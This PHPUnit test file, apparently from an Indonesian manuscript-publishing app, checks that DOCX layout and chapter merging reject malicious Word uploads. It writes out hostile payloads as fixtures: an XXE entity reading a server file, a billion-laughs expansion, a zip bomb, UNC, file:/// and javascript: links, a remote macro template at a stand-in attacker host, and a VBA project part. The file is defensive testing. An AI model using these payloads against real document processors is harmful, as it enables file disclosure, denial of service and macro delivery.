<?php

namespace Tests\Unit\Security;

use App\Support\ManuscriptTemplates\DefaultTemplates;
use App\Support\ManuscriptTemplates\DocxLayout;
use App\Support\ManuscriptTemplates\DocxMerger;
use App\Support\ManuscriptTemplates\DocxPackage;
use App\Support\ManuscriptTemplates\TemplateSchema;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use RuntimeException;
use Tests\Support\DocxFixture;
use ZipArchive;

/**
 * Serangan lewat berkas Word kiriman penulis terhadap auto layout dan
 * penggabungan Book Chapter.
 */
class DocxSecurityTest extends TestCase
{
    private const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';

    /** @var list<string> */
    private array $files = [];

    private int $maxPart;

    protected function setUp(): void
    {
        parent::setUp();
        $this->maxPart = DocxPackage::$maxPartBytes;
    }

    protected function tearDown(): void
    {
        DocxPackage::$maxPartBytes = $this->maxPart;
        array_map('unlink', array_filter($this->files, 'file_exists'));
        parent::tearDown();
    }

    /** Naskah bab contoh dengan part yang diganti/ditambah. */
    private function chapter(array $parts = [], string $marker = 'A'): string
    {
        $path = tempnam(sys_get_temp_dir(), 'sec').'.docx';
        $this->files[] = $path;
        DocxFixture::chapter($path, 'Judul', 'Penulis', $marker);

        $zip = new ZipArchive;
        $zip->open($path);

        foreach ($parts as $name => $content) {
            $zip->addFromString($name, $content);
        }

        $zip->close();

        return $path;
    }

    private function layout(string $path): string
    {
        return (new DocxLayout(
            TemplateSchema::normalize(DefaultTemplates::embeddedSystem()),
            ['title' => 'Uji', 'authors' => ['Penulis']]
        ))->apply($path);
    }

    private function merge(string $path): string
    {
        return (new DocxMerger)->merge([
            ['path' => $this->chapter(), 'number' => 1, 'title' => 'Satu', 'author' => 'A'],
            ['path' => $path, 'number' => 2, 'title' => 'Dua', 'author' => 'B'],
        ]);
    }

    /** @return array<string, string> isi semua part */
    private function parts(string $bytes): array
    {
        $file = tempnam(sys_get_temp_dir(), 'out');
        $this->files[] = $file;
        file_put_contents($file, $bytes);
        $zip = new ZipArchive;
        $zip->open($file);
        $parts = [];

        for ($i = 0; $i < $zip->numFiles; $i++) {
            $parts[$zip->getNameIndex($i)] = (string) $zip->getFromIndex($i);
        }

        $zip->close();

        return $parts;
    }

    /** @return array<string, array{string}> */
    public static function engines(): array
    {
        return ['auto layout' => ['layout'], 'gabung bab' => ['merge']];
    }

    #[DataProvider('engines')]
    public function test_external_entities_xxe_are_rejected(string $engine): void
    {
        $secret = tempnam(sys_get_temp_dir(), 'rahasia');
        $this->files[] = $secret;
        file_put_contents($secret, 'ISI-RAHASIA-SERVER');
        $uri = 'file:///'.str_replace('\\', '/', $secret);

        $document = '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY x SYSTEM "'.$uri.'">]>'
            .'<w:document xmlns:w="'.self::W.'"><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>';

        $this->expectException(RuntimeException::class);
        $this->$engine($this->chapter(['word/document.xml' => $document]));
    }

    #[DataProvider('engines')]
    public function test_entity_expansion_billion_laughs_is_rejected(string $engine): void
    {
        $entities = '<!ENTITY a0 "ha">';

        for ($i = 1; $i <= 10; $i++) {
            $entities .= '<!ENTITY a'.$i.' "'.str_repeat('&a'.($i - 1).';', 10).'">';
        }

        $document = '<?xml version="1.0"?><!doctype w:document ['.$entities.']>'
            .'<w:document xmlns:w="'.self::W.'"><w:body><w:p><w:r><w:t>&a10;</w:t></w:r></w:p></w:body></w:document>';

        $started = microtime(true);

        try {
            $this->$engine($this->chapter(['word/document.xml' => $document]));
            $this->fail('Billion laughs tidak ditolak.');
        } catch (RuntimeException) {
            $this->assertLessThan(2, microtime(true) - $started);
        }
    }

    #[DataProvider('engines')]
    public function test_zip_bombs_are_rejected_before_extraction(string $engine): void
    {
        DocxPackage::$maxPartBytes = 512 * 1024;

        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('terlalu besar');
        $this->$engine($this->chapter(['word/media/bom.bin' => str_repeat("\0", 2 * 1024 * 1024)]));
    }

    #[DataProvider('engines')]
    public function test_remote_template_unc_links_and_macros_are_neutralised(string $engine): void
    {
        $rel = fn (string $id, string $type, string $target, string $extra = '') => '<Relationship Id="'.$id.'" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'.$type.'" Target="'.htmlspecialchars($target).'"'.$extra.'/>';
        $external = ' TargetMode="External"';

        $docRels = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            .$rel('rId1', 'styles', 'styles.xml').$rel('rId2', 'numbering', 'numbering.xml').$rel('rId3', 'footnotes', 'footnotes.xml')
            .$rel('rIdImg', 'image', 'media/image1.png')
            .$rel('rIdLink', 'hyperlink', 'https://contoh.id/aman', $external)
            .$rel('rIdUnc', 'image', '\\\\penyerang\\share\\a.png', $external)
            .$rel('rIdFile', 'hyperlink', 'file:///C:/Windows/win.ini', $external)
            .$rel('rIdJs', 'hyperlink', 'javascript:alert(1)', $external)
            .'<Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>'
            .'</Relationships>';

        $settingsRels = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            .$rel('rIdTpl', 'attachedTemplate', 'http://penyerang.example/macro.dotm', $external).'</Relationships>';

        $body = '<w:p><w:hyperlink r:id="rIdUnc"><w:r><w:t>unc</w:t></w:r></w:hyperlink><w:hyperlink r:id="rIdFile"><w:r><w:t>file</w:t></w:r></w:hyperlink>'
            .'<w:hyperlink r:id="rIdJs"><w:r><w:t>js</w:t></w:r></w:hyperlink><w:hyperlink r:id="rIdLink"><w:r><w:t>aman</w:t></w:r></w:hyperlink></w:p>';
        $document = '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="'.self::W.'" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>'
            .'<w:p><w:r><w:t>BAB 1 Judul</w:t></w:r></w:p>'.$body.'<w:p><w:r><w:t>Isi bab.</w:t></w:r></w:p></w:body></w:document>';

        $types = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            .'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>'
            .'<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            .'<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            .'<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>'
            .'<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>';

        $path = $this->chapter([
            'word/document.xml' => $document,
            'word/_rels/document.xml.rels' => $docRels,
            'word/settings.xml' => '<?xml version="1.0" encoding="UTF-8"?><w:settings xmlns:w="'.self::W.'" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:attachedTemplate r:id="rIdTpl"/></w:settings>',
            'word/_rels/settings.xml.rels' => $settingsRels,
            'word/vbaProject.bin' => 'MAKRO',
            '[Content_Types].xml' => $types,
        ]);

        $parts = $this->parts($this->$engine($path));
        $rels = implode("\n", array_filter($parts, fn ($xml, $name) => str_ends_with($name, '.rels'), ARRAY_FILTER_USE_BOTH));

        foreach (['penyerang', 'file:///', 'javascript:', 'macro.dotm', 'vbaProject'] as $danger) {
            $this->assertStringNotContainsString($danger, $rels, "Relasi berbahaya \"$danger\" masih ada.");
        }

        $this->assertStringContainsString('https://contoh.id/aman', $rels);
        $this->assertArrayNotHasKey('word/vbaProject.bin', $parts);
        $this->assertStringNotContainsString('macroEnabled', $parts['[Content_Types].xml']);
        $this->assertStringNotContainsString('vbaProject', $parts['[Content_Types].xml']);
    }
}
